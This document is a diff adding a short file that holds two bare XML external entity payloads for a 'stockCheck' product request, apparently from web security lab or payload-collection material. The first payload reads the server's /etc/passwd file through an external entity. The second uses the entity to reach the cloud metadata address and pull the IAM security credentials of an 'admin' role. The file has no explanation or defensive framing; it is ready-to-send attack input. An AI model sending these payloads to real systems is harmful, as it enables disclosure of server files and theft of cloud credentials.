@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<stockCheck><productId>&ent;</productId><storeId>&ent;</storeId></stockCheck>
+
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE message [
+  <!ENTITY ext SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
+]>
+<stockCheck><productId>
+&ext;</productId><storeId>1</storeId></stockCheck>
